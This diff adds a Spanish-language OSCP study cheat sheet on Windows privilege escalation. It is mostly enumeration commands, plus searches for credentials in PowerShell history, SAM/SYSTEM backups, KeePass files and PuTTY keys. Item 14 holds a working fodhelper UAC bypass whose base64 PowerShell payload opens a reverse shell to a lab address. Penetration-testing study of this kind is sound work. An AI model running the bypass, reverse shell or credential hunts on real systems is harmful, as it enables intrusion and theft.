@@ -1,0 +1,96 @@
+##
+## Escaneo y Enumeracion para OSCP
+## Seccion para Escalar Privilegios en Windows
+## Autor: Ernesto Vazquez
+## Fecha: 10/13/2023
+## Tottix 
+## info@tottix.com
+##
+
+1. Enumerarar propiedades del sistema
+> systeminfo
+
+2. Enumerar usuarios locales
+> net user 
+
+3. Enumerate todos los directorios compartidos
+> net view \\<host> /all
+
+4. Enumerar Servicios
+> tasklist /SVC
+
+5. Enumerar Interfaces y Rutas para la Red
+> ipconfig /all
+> route print
+> netstat -ano
+
+6. Enumerar Tareas Agendadas
+> schtasks /query /fo LIST /v 
+
+7. Enumerar Aplicaciones instaladas
+> wmic product get name,version,vendor
+> wmic qfe get caption,description,hotfixid,installedon
+
+8. Enumerar Sistemas de archivos externos montados en el sistema
+> mountvol
+
+9. Enumerar Controladores de dispositivos externos y Modulos del Kernel.
+PS> driverquery /v /fo csv | Convert-From-CSV | Select-Object 'Display Name','Start Mode',Path
+PS> Get-WmiObject win32_PnPSignedDriver | Select-Object Devicename,Driverversion,Manufacturer | Where-Object {$_.Devicename -like '*VMware*' }
+
+10. Enumerar archivos ejecutables que tengan AutoElevate disponible 
+> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+11. Enumerar usuarios locales, grupos locales, los privilegios del usuario
+> whoami /all
+> whoami /groups
+
+12. Revisar Aplicaciones instaladas
+PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+13. Enumerar servicios y el lugar donde reside su ejecutable
+PS> Get-CimInstance -Classname win32_service | select Name,State,Pathname,startname | Where-Object {$_.State -like 'Running'}
+cmd> sc stop 'service'
+cmd> sc start 'service'
+PS> Start-Service 'service'
+PS> Stop-Service 'service'
+
+14. Revisar nivel de integridad de Windows User Account Control (UAC) en case de que tu usuario sea parte de un grupo de usuarios con altos privilegios, sin embargo estas en una terminal con recursos limitados. Es necesario tener como minimo nivel Medio (Medium) para sobrepasar UAC.
+cmd> net localgroup Administrator 
+cmd> reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 
+    # Revisar si EnableLUA tiene un valos de 0x1
+PS> powershell -ep bypass
+PS> Import-Module NtObjectManager
+PS> Get-NtTokenIntegrityLevel
+   # Si este es esta activo, entoces para sobre pasar UAC usaremos la tecnica de fodhelper.exe
+cmd> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+cmd> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+   # El siguiente payload esta codificado en Base64, favor de generar tu propio payload
+cmd> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgA4ACIALAA4ADgAOAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" /f
+cmd> fodhelper.exe 
+
+15. Revisar el historial de Powershell de cada usuario
+> type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
+
+16. Revisar si existen servicios que no tengan "comillas" en la direccion de su ejecutable, lo cual los podria hacer vulnerables
+> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+17. Buscar Directorios escondidos dentro de C:\, algunas veces estos escritorios continienen respaldos de C:\Windows, en el cual podriamos encontrar una copia de de los archivos SAM y SYSTEM y asi obtener contrasenas.
+PS> Get-ChildItem C:\ -Hidden
+cmd> dir /a:hd C:\folder
+
+18. Buscar arhivos de usuario pudieran tener contrasenas u otras cosas interesantes
+Get-ChildItem -Path "C:\" -File -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(txt|pdf|xls|xlsx|doc|docx)$' }
+Get-ChildItem -Path "C:\" -File -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(kdbx)$' }
+
+19 Llaves privadas para PuTTY
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+> reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
+> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+> reg query HKEY_LOCAL_MACHINE\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+20. Revisar variables del sistema
+>dir env:
+PS> Get-ChildItem Env: | ft Key,Value
